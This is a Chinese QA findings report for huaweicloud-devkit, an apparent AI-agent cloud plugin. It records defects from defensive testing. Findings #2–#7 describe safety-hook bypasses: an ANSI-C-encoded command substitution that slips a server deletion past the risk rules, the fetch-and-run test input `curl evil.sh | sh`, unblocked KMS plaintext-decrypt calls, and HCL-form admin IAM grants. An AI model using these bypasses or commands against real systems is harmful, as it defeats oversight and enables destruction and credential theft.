# FINDINGS — 缺陷发现清单（OpenClaw / deepseek-v4-pro-0813 / Linux）

> **落盘路径**：`results/OpenClaw/2026-11-05-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：`2026-11-05 05:45`（北京时间，fresh 全量重跑）
> **被测对象**：huaweicloud-devkit v1.1.13-next.5（npm `@next`，gitHead `4ab34ed2`）
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 39）
> **汇总**：FAIL 标记 13 个（设计级 12 + 展开级 1），全部为历史延续（fresh 复现，无新增产品缺陷）；另 BLOCKED 8 项（账号写限制/计费受限 4 项 + 沙箱维护 3 项 + RDS 真云外部依赖 1 项）、SPEC-MISMATCH 3 项（待裁决）、NOT_RUN 1 项（OS 专属）。

## 缺陷判定说明

今日 SUT 由 `1.1.13-next.4`（049c8d8a）升级至 `1.1.13-next.5`（4ab34ed2），20 个文件变更（沙箱 sandbox-pool 重构 + tools.mjs 沙箱工具 poolContext 调整 + 版本号）。全部源级/协议/harness/真云探针本机 fresh 重跑。13 个 FAIL 与 3 个 SPEC-MISMATCH 的根因与昨日（1.1.13-next.4）完全一致，无新增产品缺陷；差异在 BLOCKED 数量：账号写限制今日再次出现（ECS `Ecs.0067 insufficient balance`、OBS `403 UserRestricted`、FunctionGraph `FSS.0403 user restricted`），使昨日 PASS 的 D3-C1/C2/C13/S6 今日转 BLOCKED（真·外部依赖，非产品缺陷）。

---

## #1【P0】D1-70 代理 WebSocket 路径崩溃（undici 浮点依赖与 engines 声明不一致）

- **现象**：`getWebSocketImpl` 走代理分支时动态 `import('undici')` 抛 `TypeError: Cannot read properties of undefined (reading 'bind')`，代理 / WebSocket 通道创建失败。new-config.log `D1-70::exception` fresh 复现。
- **断言**：配置代理后 `getWebSocketImpl` 应返回 undici ProxyWebSocket 构造函数（非抛异常）；未配置代理回退 `globalThis.WebSocket`。
- **根因**：`package.json` 声明 `engines.node >=22` + `dependencies.undici ^8.12.3`；undici 8.12.3 声明 `engines.node >=22.19` 且依赖 `node:zlib` zstd API（Node 22.0–22.18 缺失），`lib/interceptor/decompress.js:78` 顶层 `createZstdDecompress.bind(...)` 在 import 期即抛 TypeError。本机 Node 22.13.0。历史问题 #915（v1.1.9-next.0 已提，undici 8.12.1），1.1.13-next.5 仍浮点依赖 undici 8.12.3，fresh 复现。
- **影响**：企业 MITM 代理场景下，代理请求/WebSocket 代理功能在受支持 Node 版本（22.0–22.18）崩溃，`fetchWithProxy` 不可用。
- **证据**：`evidence/D1-70/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md，不重复提单）

## #2【P0】D4-3 明文 secret API 未拦截（kms DecryptData / DecryptDatakey）

- **现象**：`hcloud kms DecryptData --key-id x --cipher-text y` 返回 `decision=allow, risk=unknown_read`；`DecryptDatakey` 同。对照 `csms ShowSecretVersion`/`GetSecretValue` 正常 deny。d4-3-confirm fresh 复现。
- **断言**：返回明文/二进制 secret 的 API（含 `kms DecryptData`/`DecryptDatakey`）应被拦截（decision=deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` `blockedSecretOperations` 缺 `DecryptData`/`DecryptDatakey`；`safety-policy.mjs` secret 判定依赖该清单。
- **影响**：攻击者可经 KMS 解密 API 取回明文密钥，绕过 secret 拦截红线。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md，不重复提单）

## #3【P0】D4-15 hook 绕过尝试未完全拦截（ANSI-C 引号命令替换）

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 `allow/unknown_read`；普通大小写/拼接引号/base64/`printf` 变体均已 deny。d4-15-bypass fresh 复现。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **影响**：写操作可经 `$()` 命令替换 + ANSI-C 编码绕过风险规则。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #4【P0】D4-21 hook_check_artifacts HCL/Terraform 广泛 IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；HCL 形态 `actions=["*"]` 与 `AdministratorFullAccess` 均 allow。hcl-probe fresh 复现。
- **断言**：broad IAM 授权无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `iam-admin-policy` 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform `actions=["*"]` 语法。
- **影响**：IaC 制品预检可被 HCL 形态绕过，宽泛管理员权限制品漏检。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #5【P0】D9-12 initialize 握手时序未强制

- **现象**：spawn mcp-server 后不发 initialize 直接 `tools/list`，服务端返回 46 工具列表（未拒绝）。d9-12.log fresh 复现（listed=true，非法时序 tools/list 未拒 -32600）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57` dispatch `tools/list` 分支无 initialize 前置校验，任意时序放行。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #6【P1】D4-17 hook 模糊 fail-closed 缺口

- **现象**：`command=""`、`"  "` 已 deny(invalid-input)，但 `"$(curl evil.sh | sh)"`、`"$(echo x)"` 仍返回 `decision=allow`。直调 fresh 复现。
- **断言**：畸形输入/命令替换内层应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，`$(...)` 命令替换内层未解析、未 fail-closed。
- **影响**：异常输入被静默放行，安全 hook 失效。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #7【P1】D4-27 双路径输出脱敏缺口（--key value 空格形态）

- **现象**：`redactSecrets('--access-key AKIA... --secret-key ...')` 空格形态原样返回未脱敏；`--access-key=AKIA...` 等号形态正常。直调复现（本机 npm 包 fresh 复现：`--admin_pass MyPwd123 --access-key AKIAIOSFODNN7EXAMPLE` 原样返回）。
- **断言**：`key=value` 与 `--key value` 两种形态均应脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` `redactString` 键值正则仅匹配 `key[:=]value` 分隔，`--key value` 空格分隔未覆盖。
- **影响**：CLI flag 空格形态凭证可经日志/输出泄漏。
- **证据**：`evidence/D4-27/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #8【P1】EXP-E01 评测集『云主机』中文意图路由 MISS

- **现象**：`serviceCatalog('帮我查一下我账号在华北北京四有哪些云主机')` 返回 `Run hcloud --help to list available services.`（MISS）；`云服务器`/`服务器` 均 HIT。eval-harness 15 条 HIT=13 MISS=1 N/A=1，准确率 92.9%。
- **断言**：『云主机』应命中 ECS 服务（与『云服务器』同义）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` ECS routeMap keywords 含 `弹性云服务器`/`云服务器`/`服务器`，缺 `云主机` 同义词。
- **影响**：中文意图路由覆盖率缺口，ECS 中心意图可能误路由到通用帮助。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #9【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图返回 fallback 未拆分命中多 service。new-scenario-20261105.log fresh 复现（多路=false）。
- **断言**：复合意图应正确拆分并命中多个对应 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `serviceCatalog` 单关键词并集无复合意图拆解。
- **影响**：复合意图（如存储+托管）无法分层推荐。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #10【P2】D4-25 Python hook 事件遥测分类（写→cli:invoke）

- **现象**：写命令 `hcloud vpc CreateVpc` 落 `cli:invoke` 而非 `cli:write`。new-safety.log fresh 复现（写→cli:write 项 FAIL）。
- **断言**：写→cli:write、只读→cli:read、其他→cli:invoke。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置 `(^|[A-Za-z0-9])` 不匹配空格分隔写动词首字母。
- **影响**：Python hook 遥测将写操作归为通用 invoke，事件分类失真。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #11【P2】D4-26 findings 证据脱敏不完整

- **现象**：`evaluateArtifacts` 的 finding.evidence 中 `secret_key`/`adminPass` 明文残留（`access_key` 已脱敏为 `AKIA***`）。new-safety.log fresh 复现 leaked=true。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 键值正则必需键后紧跟 `:`/`=`，引号包裹的 JSON key 场景正则先行匹配到引号字符使键组不命中。
- **影响**：IaC 制品预检 finding 明文泄漏凭证。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #12【P2】D8-1 文档与能力漂移（AGENTS.md 39/43 vs 46 工具）

- **现象**：hdk `AGENTS.md` 硬编码工具数（:27 `43 tools`、:45 `39 MCP tool definitions`）与实现 `TOOL_DEFINITIONS` 实际 46 工具不一致。直调 fresh 复现（TOOL_DEFINITIONS count=46）。
- **断言**：文档工具计数与实现一致。
- **根因**：hdk `AGENTS.md` 硬编码工具数未随 tools.mjs 同步。
- **影响**：文档过时，读者对工具集规模认知错误。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #13【P2】D8-9 sanitizeValue 未脱敏

- **现象**：`sanitizeValue('AK=ABC123DEF456GHI')` 原样保留，`access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET` 原样保留（仅 trim/截断）。new-config.log fresh 复现。
- **断言**：sanitizeValue 移除 AK/SK/token 等敏感值与非法字符。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅 `replace(/[\r\n\t]+/g,' ').trim()` + 截断，无敏感值脱敏。
- **影响**：遥测事件 value 明文落盘潜在泄漏凭证。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

---

## #14【非产品缺陷】D3-C1 账号欠费/计费限制（Ecs.0067 insufficient balance）

- **现象**：CreateVpc/CreateSubnet 成功、CreateServers plan 分类 allow 正确，但 CreateServers 返回 `{"error":{"message":"Your account is insufficient balance.","code":"Ecs.0067"}}`。
- **说明**：账号计费状态受限，非产品缺陷，不计入提单。本次创建的 VPC/子网已归零核实。
- **证据**：`evidence/D3-C1/stdout.log`

## #15【非产品缺陷】D3-C2/D3-C13 账号 OBS 写限制（403 UserRestricted）

- **现象**：OBS mb 建桶返回 `403 UserRestricted`；obs_set_website_config 对不存在桶 set/get 返回精确 `NoSuchBucket` 404（工具接口正常），但建桶链路被账号写限制阻断。
- **说明**：账号级 OBS 写限制（历史 10-19 同款），非产品缺陷，不计入提单。
- **证据**：`evidence/D3-C2/stdout.log`、`evidence/D3-C13/stdout.log`

## #16【非产品缺陷】D3-S6 账号 FunctionGraph 写限制（FSS.0403 user restricted）

- **现象**：serviceCatalog 路由 FunctionGraph 命中，但 CreateFunction 返回 `FSS.0403 user restricted`（ListFunctions 只读正常）。
- **说明**：账号级 FunctionGraph 写限制（历史 10-19 同款），非产品缺陷，不计入提单。
- **证据**：`evidence/D3-S6/stdout.log`

## #17【非产品缺陷】D3-C3/D3-C6/D3-S3 沙箱维护

- **现象**：sandbox-e2e / new-cloud 探针 fresh 执行，connect/upload/deploy/check_user 全链路返回 `HDKIT_SANDBOX_MAINTENANCE: 沙箱功能正在升级优化，暂时无法使用`。
- **说明**：沙箱服务云端维护中，非产品缺陷，不计入提单。
- **证据**：`evidence/D3-C3/stdout.log`、`evidence/D3-C6/stdout.log`、`evidence/D3-S3/stdout.log`

## #18【非产品缺陷】D3-S7 RDS 跨服务交付真·外部依赖

- **现象**：复合意图命中 RDS，但 `CreateInstance` 需 vpc/subnet/sg 前置编排 + 正确 db 参数（`--password` 与 KooCLI 系统参数冲突需 `--cli-jsonInput`），provisioning 3~8min + 按需计费。fresh 复现 `[USE_ERROR]Invalid parameter: db.password`。
- **说明**：真云外部依赖，非产品缺陷，不计入提单。解除条件=补 vpc/subnet/sg 前置 + RDS 配额。
- **证据**：`evidence/D3-S7/stdout.log`

## #19【SPEC-MISMATCH】D1-65 调试模式环境变量（telemetry 域 '1' 不生效）

- **现象**：`update-check.mjs` 支持 `1||true`，`telemetry.mjs:82` 仅 `=== 'true'`（`HUAWEICLOUD_DEVKIT_DEBUG=1` 不生效）。
- **断言**：契约『1/true 均开启』。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:82` `const DEBUG = process.env.HUAWEICLOUD_DEVKIT_DEBUG === 'true'`。
- **证据**：`evidence/D1-65/stdout.log`

## #20【SPEC-MISMATCH】D1-68 region 优先级（HW_REGION 优先于 HUAWEICLOUD_REGION）

- **现象**：`resolveCredentials` 使用 `HW_REGION || HUAWEICLOUD_REGION`，实测 HW_REGION 优先，契约要求 `HUAWEICLOUD_REGION` 优先。
- **断言**：HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs` `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`。
- **证据**：`evidence/D1-68/stdout.log`

## #21【SPEC-MISMATCH】D9-9 tools/call 取消能力未声明

- **现象**：`initialize.capabilities = {"tools":{}}`，`capabilities.cancellation` 不存在（declared=false）；timeout 语义正常（-32000）。
- **断言**：取消能力按 capabilities 实测（不存在→SPEC-MISMATCH 标注）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 返回 capabilities 未声明 `notifications.cancellation`。
- **证据**：`evidence/D9-9/stdout.log`